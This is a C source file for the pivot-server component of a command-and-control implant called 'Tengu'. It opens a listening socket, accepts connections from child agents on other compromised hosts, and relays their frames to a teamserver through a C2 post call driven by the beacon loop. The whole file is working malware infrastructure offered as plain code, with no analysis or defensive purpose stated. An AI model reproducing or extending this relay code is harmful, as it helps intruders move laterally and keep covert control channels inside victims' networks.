#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <fcntl.h>
#include <arpa/inet.h>

#include "tengu.h"

#define MAX_PIVOT_CHILDREN 8

typedef struct {
    uint32_t agent_id;
    int      fd;
} PivotChild;

static int        g_pivot_sockfd = -1;
static PivotChild g_pivot_children[MAX_PIVOT_CHILDREN];

void pivot_server_init(void) {
    g_pivot_sockfd = -1;
    for (int i = 0; i < MAX_PIVOT_CHILDREN; i++)
        g_pivot_children[i].fd = -1;
}

int pivot_server_listen(int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return -1;

    int opt = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons((uint16_t)port);

    if (bind(fd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(fd);
        return -1;
    }

    if (listen(fd, MAX_PIVOT_CHILDREN) < 0) {
        close(fd);
        return -1;
    }

    int flags = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, flags | O_NONBLOCK);

    g_pivot_sockfd = fd;
    return 0;
}

void pivot_server_write(uint32_t child_id, const uint8_t* data, size_t len) {
    if (!data || len == 0) return;
    for (int i = 0; i < MAX_PIVOT_CHILDREN; i++) {
        if (g_pivot_children[i].fd >= 0 && g_pivot_children[i].agent_id == child_id) {
            size_t sent = 0;
            while (sent < len) {
                ssize_t n = write(g_pivot_children[i].fd, data + sent, len - sent);
                if (n <= 0) {
                    close(g_pivot_children[i].fd);
                    g_pivot_children[i].fd = -1;
                    return;
                }
                sent += (size_t)n;
            }
            return;
        }
    }
}

void pivot_server_disconnect(uint32_t child_id) {
    for (int i = 0; i < MAX_PIVOT_CHILDREN; i++) {
        if (g_pivot_children[i].fd >= 0 && g_pivot_children[i].agent_id == child_id) {
            close(g_pivot_children[i].fd);
            g_pivot_children[i].fd = -1;
            return;
        }
    }
}

int pivot_server_active(void) {
    if (g_pivot_sockfd >= 0) return 1;
    for (int i = 0; i < MAX_PIVOT_CHILDREN; i++)
        if (g_pivot_children[i].fd >= 0) return 1;
    return 0;
}

// Extract AgentID from bytes 8-11 of a Tengu outer header (big-endian).
static uint32_t extract_agent_id(const uint8_t* frame, size_t frame_len) {
    if (frame_len < 12) return 0;
    return ((uint32_t)frame[8]  << 24)
         | ((uint32_t)frame[9]  << 16)
         | ((uint32_t)frame[10] <<  8)
         |  (uint32_t)frame[11];
}

// Read a complete Tengu packet from fd.
// The first 4 bytes (BE) give the total packet size (including those 4 bytes).
// Returns malloc'd buffer on success, NULL on error. Caller must free.
static uint8_t* read_full_packet(int fd, size_t* out_len) {
    uint8_t hdr[4];
    ssize_t n = recv(fd, hdr, 4, MSG_WAITALL);
    if (n != 4) return NULL;

    uint32_t total = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16)
                   | ((uint32_t)hdr[2] <<  8) |  (uint32_t)hdr[3];
    if (total < 12 || total > 4 * 1024 * 1024) return NULL;

    uint8_t* buf = malloc(total);
    if (!buf) return NULL;
    memcpy(buf, hdr, 4);

    size_t got = 4;
    while (got < total) {
        n = recv(fd, buf + got, total - got, 0);
        if (n <= 0) { free(buf); return NULL; }
        got += (size_t)n;
    }
    *out_len = total;
    return buf;
}

// Relay a child frame to the TS and return the raw TS response.
// Format sent: [outer_hdr][TENGU_PIVOT_TCP_DATA:4BE][0:4BE][payload_size:4BE]
//              [child_id:4BE][frame_len:4BE][frame_bytes]
// Caller must free *resp_out.
static void relay_to_ts(uint32_t child_id,
                         const uint8_t* frame, size_t frame_len,
                         uint8_t** resp_out, size_t* resp_len_out) {
    // payload_size = child_id(4) + frame_len_prefix(4) + frame_bytes
    uint32_t payload_size = 4 + 4 + (uint32_t)frame_len;

    Buf* body = buf_new();
    buf_push_u32be(body, TENGU_PIVOT_TCP_DATA);
    buf_push_u32be(body, 0);
    buf_push_u32be(body, payload_size);
    buf_push_u32be(body, child_id);
    buf_push_u32be(body, (uint32_t)frame_len);
    buf_push_bytes(body, frame, frame_len);

    Buf* pkt = buf_new();
    buf_push_u32be(pkt, 12 + (uint32_t)body->size);
    buf_push_u32be(pkt, TENGU_MAGIC_VALUE);
    buf_push_u32be(pkt, g_agent_id);
    buf_push_bytes(pkt, body->data, body->size);
    buf_free(body);

    g_c2_post(pkt->data, pkt->size, resp_out, resp_len_out);
    buf_free(pkt);
}

// Send a DISCONNECT notification to the TS (fire-and-forget).
static void notify_disconnect(uint32_t child_id) {
    Buf* body = buf_new();
    buf_push_u32be(body, TENGU_PIVOT_TCP_DISCONN);
    buf_push_u32be(body, 0);
    buf_push_u32be(body, 4);
    buf_push_u32be(body, child_id);

    Buf* pkt = buf_new();
    buf_push_u32be(pkt, 12 + (uint32_t)body->size);
    buf_push_u32be(pkt, TENGU_MAGIC_VALUE);
    buf_push_u32be(pkt, g_agent_id);
    buf_push_bytes(pkt, body->data, body->size);
    buf_free(body);

    g_c2_post(pkt->data, pkt->size, NULL, NULL);
    buf_free(pkt);
}

// Called from the main beacon loop.
// Accepts new child connections and relays child frames to the TS.
// Returns TS response bytes for the caller (main.c) to pass to process_response.
// Caller must free the returned pointer.
uint8_t* pivot_server_collect_ex(size_t* resp_len_out) {
    *resp_len_out = 0;

    fd_set rfds;
    FD_ZERO(&rfds);
    int maxfd = -1;

    if (g_pivot_sockfd >= 0) {
        FD_SET(g_pivot_sockfd, &rfds);
        if (g_pivot_sockfd > maxfd) maxfd = g_pivot_sockfd;
    }
    for (int i = 0; i < MAX_PIVOT_CHILDREN; i++) {
        if (g_pivot_children[i].fd >= 0) {
            FD_SET(g_pivot_children[i].fd, &rfds);
            if (g_pivot_children[i].fd > maxfd) maxfd = g_pivot_children[i].fd;
        }
    }
    if (maxfd < 0) return NULL;

    struct timeval tv = {0, 0};
    if (select(maxfd + 1, &rfds, NULL, NULL, &tv) <= 0) return NULL;

    // Accept new child.
    if (g_pivot_sockfd >= 0 && FD_ISSET(g_pivot_sockfd, &rfds)) {
        int child_fd = accept(g_pivot_sockfd, NULL, NULL);
        if (child_fd >= 0) {
            size_t frame_len = 0;
            uint8_t* frame = read_full_packet(child_fd, &frame_len);
            if (frame && frame_len >= 12) {
                uint32_t child_id = extract_agent_id(frame, frame_len);

                int stored = 0;
                for (int i = 0; i < MAX_PIVOT_CHILDREN; i++) {
                    if (g_pivot_children[i].fd < 0) {
                        g_pivot_children[i].fd       = child_fd;
                        g_pivot_children[i].agent_id = child_id;
                        stored = 1;
                        break;
                    }
                }
                if (!stored) {
                    close(child_fd);
                    free(frame);
                    return NULL;
                }

                uint8_t* resp = NULL;
                size_t   rlen = 0;
                relay_to_ts(child_id, frame, frame_len, &resp, &rlen);
                free(frame);
                if (resp && rlen > 0) {
                    *resp_len_out = rlen;
                    return resp;
                }
                free(resp);
                return NULL;
            }
            free(frame);
            close(child_fd);
        }
    }

    // Read data from existing children (process one per call for simplicity).
    for (int i = 0; i < MAX_PIVOT_CHILDREN; i++) {
        if (g_pivot_children[i].fd < 0) continue;
        if (!FD_ISSET(g_pivot_children[i].fd, &rfds)) continue;

        size_t frame_len = 0;
        uint8_t* frame = read_full_packet(g_pivot_children[i].fd, &frame_len);
        if (!frame) {
            uint32_t child_id = g_pivot_children[i].agent_id;
            close(g_pivot_children[i].fd);
            g_pivot_children[i].fd = -1;
            notify_disconnect(child_id);
            continue;
        }

        uint32_t child_id = g_pivot_children[i].agent_id;
        uint8_t* resp = NULL;
        size_t   rlen = 0;
        relay_to_ts(child_id, frame, frame_len, &resp, &rlen);
        free(frame);

        if (resp && rlen > 0) {
            *resp_len_out = rlen;
            return resp;
        }
        free(resp);
    }

    return NULL;
}
